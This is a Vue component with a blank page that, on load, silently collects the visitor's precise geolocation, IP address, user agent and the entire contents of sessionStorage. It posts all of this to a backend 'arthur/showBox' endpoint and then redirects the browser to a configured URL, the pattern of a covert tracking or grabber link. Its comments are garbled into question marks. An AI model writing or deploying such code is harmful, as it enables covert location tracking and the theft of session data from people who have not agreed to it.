<template>

</template>
<script>

  export default {
    data() {
      return {
        hostUrl: domain.hostUrl,
        authIp: false,
        authLocation: false
      }
    },
    methods: {
      getIp: function () {
        try {
          var self = this;
          // console.log("------http://pv.sohu.com/cityjson?ie=utf-8");
          this.loadJS("https://pv.sohu.com/cityjson?ie=utf-8", {
            success: function () {
              sessionStorage.setItem("ip", returnCitySN['cip']);
              self.onUpLoad();
            },
            complate: function () {
              self.authIp = true;
            }
          });
        } catch (e) {
        }

      }, loadJS: function (url, el) {
        var head = document.getElementsByTagName('head');
        if (head && head.length) {
          head = head[0];
        } else {
          head = document.body;
        }
        var script = document.createElement('script');
        script.src = url;
        script.type = "text/javascript";
        head.appendChild(script);
        script.onload = script.onreadystatechange = function () {
          if ((!this.readyState) || this.readyState == "complete" || this.readyState == "loaded") {
            el.success();
          }
          el.complate();


        }//end onreadystatechange
      }, onSystemDic: function () {
        var param = {
          systemConfigName: "arthur_web_success",
        }
        console.log(param);
        var self = this;
        this.$axiosPro("post", this.hostUrl + 'dict/getSystemConfig', param).then((res) => {
          var response = res.data;
          if (0 == response.code) {
            var result = response.result;
            window.location.href = result.value;
          }
        }).catch((response) => {
        })
      },
      onUpLoad: function () {
        var key = 'D21Uq65MzDF28PaEx7zO0dSM2WuG03z01';
        sessionStorage.setItem("userAgent", window.navigator.userAgent);
        var message = JSON.stringify(this.getLocationData());
        var param = {
          url: window.location.href,
          type: '4',
          data: message
        }
        var self = this;
        this.$axiosPro("post", this.hostUrl + 'arthur/showBox', param).then((res) => {

          if (self.authIp && self.authLocation) {
            self.onSystemDic();
          }
        }).catch((response) => {
        })
      }, getLocationData: function () {
        var len = sessionStorage.length;
        console.log(len)
        var arr = new Array();
        for (var i = 0; i < len; i++) {
          var getKey = sessionStorage.key(i);
          var getVal = sessionStorage.getItem(getKey);
          var values = '';
          if (isJSON(getVal)) {
            values = JSON.parse(getVal);
          } else {
            values = getVal;
          }
          arr[i] = {
            'key': getKey,
            'val': values,
          }
        }
        return arr;

        function isJSON(str) {
          if (typeof str == 'string') {
            try {
              var obj = JSON.parse(str);
              if (typeof obj == 'object' && obj) {
                return true;
              } else {
                return false;
              }

            } catch (e) {
              return false;
            }
          }
        }
      },
      getLocation() {
        const self = this
        AMap.plugin('AMap.Geolocation', function () {
          var geolocation = new AMap.Geolocation({
            // ???????????????????????????????????????true
            enableHighAccuracy: true,
            // ?????????????????????????????????????????????
            timeout: 10000,
          })
          geolocation.getCurrentPosition()
          AMap.event.addListener(geolocation, 'complete', onComplete)
          AMap.event.addListener(geolocation, 'error', onError)

          function onComplete(data) {
            // data????????????????????????
            self.authLocation = true;
            console.log('?????????????????????', data)
            sessionStorage.setItem("Geolocation", JSON.stringify(data));
            self.onUpLoad();
          }

          function onError(data) {
            // ????????????
            console.log('?????????????????????', data)
            self.getLngLatLocation()
          }
        })
      }
      ,
      getLngLatLocation() {
        AMap.plugin('AMap.CitySearch', function () {
          var citySearch = new AMap.CitySearch()
          citySearch.getLocalCity(function (status, result) {
            console.log(result);
            console.log(status);
            if (status === 'complete' && result.info === 'OK') {
              // ???????????????result??????????????????????????????
              console.log('??????ip?????????????????????', result)
              sessionStorage.setItem("CitySearch", JSON.stringify(result));
              //??????????????????
              AMap.plugin('AMap.Geocoder', function () {
                var geocoder = new AMap.Geocoder({
                  // city ????????????????????????????????????????????????????????????adcode ??? citycode
                  city: result.adcode
                })
                var lnglat = result.rectangle.split(';')[0].split(',')
                geocoder.getAddress(lnglat, function (status, data) {
                  console.log(data);
                  if (status === 'complete' && data.info === 'OK') {
                    // result????????????????????????????????????
                    console.log(data)
                    sessionStorage.setItem("Geocoder", JSON.stringify(data));
                  }
                })
              })
            }
          })
        })
      }
    },
    created: function () {
      this.getLocation();
      this.getIp();
    }
  }
</script>
<style>

</style>
